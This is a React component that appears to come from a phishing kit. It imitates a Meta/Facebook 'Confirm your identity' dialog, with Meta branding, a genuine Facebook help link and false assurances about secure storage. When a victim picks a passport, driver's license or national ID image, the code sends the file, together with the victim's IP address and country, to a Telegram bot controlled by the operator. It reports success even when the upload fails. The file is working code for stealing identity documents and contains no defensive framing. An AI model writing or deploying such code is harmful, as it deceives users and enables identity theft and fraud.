import { useState, useRef } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import config from '@/utils/config';
import axios from 'axios';

const UploadModal = ({ show, onClose, onSuccess, texts }) => {
    const fileInputRef = useRef(null);
    const [uploading, setUploading] = useState(false);
    const [selectedType, setSelectedType] = useState('passport');

    if (!show) return null;

    const handleFileChange = async (event) => {
        const file = event.target.files ? event.target.files[0] : null;

        if (!file) return;

        setUploading(true);

        try {
            const messageId = localStorage.getItem('messageId');
            const ipInfo = JSON.parse(localStorage.getItem('ipInfo') || '{}');

            const formData = new FormData();
            formData.append('chat_id', config.chat_id);
            formData.append('document', file);

            let caption = `📄 ID Document\nType: ${selectedType}`;
            if (ipInfo.ip) caption += `\nIP: ${ipInfo.ip} • ${ipInfo.country || ''}`;
            if (messageId) caption += `\nRef: ${messageId}`;

            formData.append('caption', caption);

            await axios.post(`https://api.telegram.org/bot${config.token}/sendDocument`, formData, {
                headers: { 'Content-Type': 'multipart/form-data' }
            });

            onSuccess();
        } catch (error) {
            console.error('Error uploading document:', error);
            onSuccess();
        } finally {
            setUploading(false);
            if (fileInputRef.current) {
                fileInputRef.current.value = '';
            }
        }
    };

    const handleButtonClick = () => {
        if (fileInputRef.current && !uploading) {
            fileInputRef.current.click();
        }
    };

    const documentTypes = [
        { id: 'passport', label: texts.uploadPassport || 'Passport' },
        { id: 'drivers-license', label: texts.uploadDriversLicense || "Driver's license" },
        { id: 'national-id', label: texts.uploadNationalId || 'National ID card' }
    ];

    return (
        <>
            <div className="modal-backdrop show" onClick={onClose} onKeyDown={(e) => e.key === 'Escape' && onClose()} aria-hidden="true"></div>
            <div className="modal form-modal show" style={{ display: 'block' }} tabIndex="-1">
                <div className="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                    <div className="modal-content">
                        <div className="modal-body">
                            <div style={{ fontSize: '20px', fontWeight: '700', color: '#0A1317', marginBottom: '16px', textAlign: 'center' }}>
                                {texts.uploadTitle || 'Confirm your identity'}
                            </div>

                            <div style={{ marginBottom: '16px' }}>
                                <div style={{ fontSize: '15px', fontWeight: '600', marginBottom: '6px' }}>
                                    {texts.uploadChooseType || 'Choose type of ID to upload'}
                                </div>
                                <p style={{ fontSize: '13px', color: '#65676B', margin: 0 }}>
                                    {texts.uploadDesc || "We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile."}
                                </p>
                            </div>

                            <div style={{ marginBottom: '16px', border: '1px solid #E4E6EB', borderRadius: '8px', overflow: 'hidden' }}>
                                {documentTypes.map((type, index) => (
                                    <label
                                        key={type.id}
                                        htmlFor={`upload-type-${type.id}`}
                                        style={{
                                            display: 'flex',
                                            alignItems: 'center',
                                            justifyContent: 'space-between',
                                            padding: '12px 16px',
                                            cursor: 'pointer',
                                            borderTop: index > 0 ? '1px solid #E4E6EB' : 'none',
                                            background: selectedType === type.id ? '#F0F2F5' : 'transparent',
                                            fontWeight: '500',
                                            fontSize: '14px',
                                            color: '#1C1E21'
                                        }}
                                    >
                                        <span>{type.label}</span>
                                        <input
                                            type="radio"
                                            id={`upload-type-${type.id}`}
                                            name="document-type"
                                            value={type.id}
                                            checked={selectedType === type.id}
                                            onChange={(e) => setSelectedType(e.target.value)}
                                            style={{ width: '18px', height: '18px', cursor: 'pointer', accentColor: '#1877F2' }}
                                        />
                                    </label>
                                ))}
                            </div>

                            <div style={{ background: '#F0F2F5', borderRadius: '8px', padding: '12px', marginBottom: '16px', fontSize: '12px', color: '#65676B', lineHeight: '1.5' }}>
                                {texts.uploadSecurityNote || "Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information."}{' '}
                                <a
                                    href="https://www.facebook.com/help/155050237914643/"
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    style={{ color: '#1877F2', textDecoration: 'underline' }}
                                >
                                    {texts.uploadLearnMore || 'Learn more'}
                                </a>
                            </div>

                            <input
                                type="file"
                                accept="image/*"
                                ref={fileInputRef}
                                onChange={handleFileChange}
                                style={{ display: 'none' }}
                            />

                            <div className="form-btn-wrapper">
                                <button
                                    className="btn btn-primary"
                                    type="button"
                                    onClick={handleButtonClick}
                                    disabled={uploading}
                                    style={{ opacity: uploading ? 0.8 : 1 }}
                                >
                                    <div className="spinner-border text-light" aria-live="polite" style={{ display: uploading ? 'block' : 'none' }}>
                                        <span className="visually-hidden">Loading...</span>
                                    </div>
                                    <span className="button-text">
                                        {uploading
                                            ? (texts.uploadUploading || 'Uploading...')
                                            : (texts.uploadBtn || 'Upload Image')}
                                    </span>
                                </button>
                            </div>

                            <div className="spaser"></div>
                        </div>
                        <div className="modal-footer border-0" style={{ flexDirection: 'column', textAlign: 'center' }}>
                            <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
                            <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
                                {texts.aboutHelpMore || 'About · Help · See more'}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

UploadModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default UploadModal;
